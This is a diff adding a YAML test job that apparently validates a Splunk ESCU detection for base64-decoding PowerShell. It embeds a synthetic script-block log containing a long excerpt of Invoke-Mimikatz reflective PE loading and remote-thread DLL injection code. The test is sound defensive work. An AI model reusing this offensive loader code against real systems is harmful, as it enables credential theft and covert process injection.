@@ -1,0 +1,210 @@
+type: job
+name: Powershell Fileless Script Contains Base64 Encoded Content
+detection:
+  source: escu
+  name: "ESCU - Powershell Fileless Script Contains Base64 Encoded Content - Rule"
+  id: 8acbc04c-c882-11eb-b060-acde48001122
+description: |
+  Validates detection of PowerShell decoding Base64 content:
+  PowerShell/Operational EID 4104 (Script Block Logging) records a block
+  defining a Main function that decodes embedded PE bytes with
+  [Convert]::FromBase64String, passes them to Invoke-MemoryLoadLibrary for
+  reflective loading, and looks up the powershell_reflective_mimikatz
+  export, code from Invoke-Mimikatz.
+tags: [mimikatz]
+
+mitre:
+  tactics: [execution, defense-evasion]
+  techniques: [T1027, T1059.001]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      script_block_text: "Function Main\n\
+        \t{\n\
+        \t\t$Win32Functions = Get-Win32Functions\n\
+        \t\t$Win32Types = Get-Win32Types\n\
+        \t\t$Win32Constants =  Get-Win32Constants\n\
+        \t\t\n\
+        \t\t$RemoteProcHandle = [IntPtr]::Zero\n\
+        \t\n\
+        \t\t#If a remote process to inject in to is specified, get a handle to it\n\
+        \t\tif (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne \"\"))\n\
+        \t\t{\n\
+        \t\t\tThrow \"Can't supply a ProcId and ProcName, choose one or the other\"\n\
+        \t\t}\n\
+        \t\telseif ($ProcName -ne $null -and $ProcName -ne \"\")\n\
+        \t\t{\n\
+        \t\t\t$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)\n\
+        \t\t\tif ($Processes.Count -eq 0)\n\
+        \t\t\t{\n\
+        \t\t\t\tThrow \"Can't find process $ProcName\"\n\
+        \t\t\t}\n\
+        \t\t\telseif ($Processes.Count -gt 1)\n\
+        \t\t\t{\n\
+        \t\t\t\t$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId\n\
+        \t\t\t\tWrite-Output $ProcInfo\n\
+        \t\t\t\tThrow \"More than one instance of $ProcName found, please specify the process ID to inject in to.\"\n\
+        \t\t\t}\n\
+        \t\t\telse\n\
+        \t\t\t{\n\
+        \t\t\t\t$ProcId = $Processes[0].ID\n\
+        \t\t\t}\n\
+        \t\t}\n\
+        \t\t\n\
+        \t\t#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.\n\
+        \t\t#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege\n\
+        #\t\tif ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)\n\
+        #\t\t{\n\
+        #\t\t\tWrite-Verbose \"Getting SeDebugPrivilege\"\n\
+        #\t\t\tEnable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\n\
+        #\t\t}\t\n\
+        \t\t\n\
+        \t\tif (($ProcId -ne $null) -and ($ProcId -ne 0))\n\
+        \t\t{\n\
+        \t\t\t$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)\n\
+        \t\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\
+        \t\t\t{\n\
+        \t\t\t\tThrow \"Couldn't obtain the handle for process ID: $ProcId\"\n\
+        \t\t\t}\n\
+        \t\t\t\n\
+        \t\t\tWrite-Verbose \"Got the handle for the remote process to inject in to\"\n\
+        \t\t}\n\
+        \t\t\n\
+        \n\
+        \t\t#Load the PE reflectively\n\
+        \t\tWrite-Verbose \"Calling Invoke-MemoryLoadLibrary\"\n\
+        \n\
+        \x20       try\n\
+        \x20       {\n\
+        \x20           $Processors = Get-WmiObject -Class Win32_Processor\n\
+        \x20       }\n\
+        \x20       catch\n\
+        \x20       {\n\
+        \x20           throw ($_.Exception)\n\
+        \x20       }\n\
+        \n\
+        \x20       if ($Processors -is [array])\n\
+        \x20       {\n\
+        \x20           $Processor = $Processors[0]\n\
+        \x20       } else {\n\
+        \x20           $Processor = $Processors\n\
+        \x20       }\n\
+        \n\
+        \x20       if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )\n\
+        \x20       {\n\
+        \x20           Write-Verbose ( \"Architecture: \" + $Processor.AddressWidth + \" Process: \" + ([System.IntPtr]::Size * 8))\n\
+        \x20           Write-Error \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\" -ErrorAction Stop\n\
+        \x20       }\n\
+        \n\
+        \x20       #Determine whether or not to use 32bit or 64bit bytes\n\
+        \x20       if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)\n\
+        \x20       {\n\
+        \x20           [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)\n\
+        \x20       }\n\
+        \x20       else\n\
+        \x20       {\n\
+        \x20           [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)\n\
+        \x20       }\n\
+        \x20       $PEBytes[0] = 0\n\
+        \x20       $PEBytes[1] = 0\n\
+        \t\t$PEHandle = [IntPtr]::Zero\n\
+        \t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\
+        \t\t{\n\
+        \t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\n\
+        \t\t}\n\
+        \t\telse\n\
+        \t\t{\n\
+        \t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle\n\
+        \t\t}\n\
+        \t\tif ($PELoadedInfo -eq [IntPtr]::Zero)\n\
+        \t\t{\n\
+        \t\t\tThrow \"Unable to load PE, handle returned is NULL\"\n\
+        \t\t}\n\
+        \t\t\n\
+        \t\t$PEHandle = $PELoadedInfo[0]\n\
+        \t\t$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process\n\
+        \t\t\n\
+        \t\t\n\
+        \t\t#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.\n\
+        \t\t$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\
+        \t\tif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\n\
+        \t\t{\n\
+        \t\t\t#########################################\n\
+        \t\t\t### YOUR CODE GOES HERE\n\
+        \t\t\t#########################################\n\
+        \x20                   Write-Verbose \"Calling function with WString return type\"\n\
+        \t\t\t\t    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"powershell_reflective_mimikatz\"\n\
+        \t\t\t\t    if ($WStringFuncAddr -eq [IntPtr]::Zero)\n\
+        \t\t\t\t    {\n\
+        \t\t\t\t\t    Throw \"Couldn't find function address.\"\n\
+        \t\t\t\t    }\n\
+        \t\t\t\t    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])\n\
+        \t\t\t\t    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)\n\
+        \x20                   $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)\n\
+        \t\t\t\t    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)\n\
+        \x20                   [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)\n\
+        \t\t\t\t    if ($OutputPtr -eq [IntPtr]::Zero)\n\
+        \t\t\t\t    {\n\
+        \t\t\t\t    \tThrow \"Unable to get output, Output Ptr is NULL\"\n\
+        \t\t\t\t    }\n\
+        \t\t\t\t    else\n\
+        \t\t\t\t    {\n\
+        \t\t\t\t        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)\n\
+        \t\t\t\t        Write-Output $Output\n\
+        \t\t\t\t        $Win32Functions.LocalFree.Invoke($OutputPtr);\n\
+        \t\t\t\t    }\n\
+        \t\t\t#########################################\n\
+        \t\t\t### END OF YOUR CODE\n\
+        \t\t\t#########################################\n\
+        \t\t}\n\
+        \t\t#For remote DLL injection, call a void function which takes no parameters\n\
+        \t\telseif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n\
+        \t\t{\n\
+        \t\t\t$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\n\
+        \t\t\tif (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))\n\
+        \t\t\t{\n\
+        \t\t\t\tThrow \"VoidFunc couldn't be found in the DLL\"\n\
+        \t\t\t}\n\
+        \t\t\t\n\
+        \t\t\t$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle\n\
+        \t\t\t$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle\n\
+        \t\t\t\n\
+        \t\t\t#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors\n\
+        \t\t\t$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions\n\
+        \t\t}\n\
+        \t\t\n\
+        \t\t#Don't free a library if it is injected in a remote process\n\
+        \t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\
+        \t\t{\n\
+        \t\t\tInvoke-MemoryFreeLibrary -PEHandle $PEHandle\n\
+        \t\t}\n\
+        \t\telse\n\
+        \t\t{\n\
+        \t\t\t#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process\n\
+        \t\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\
+        \t\t\tif ($Success -eq $false)\n\
+        \t\t\t{\n\
+        \t\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\
+        \t\t\t}\n\
+        \t\t}\n\
+        \t\t\n\
+        \t\tWrite-Verbose \"Done!\"\n\
+        \t}"
+    expectation:
+      expected: alert
+      summary: "PowerShell logs a block decoding PE bytes with [Convert]::FromBase64String"
+      mitre:
+        tactics: [execution, defense-evasion]
+        techniques: [T1027, T1059.001]
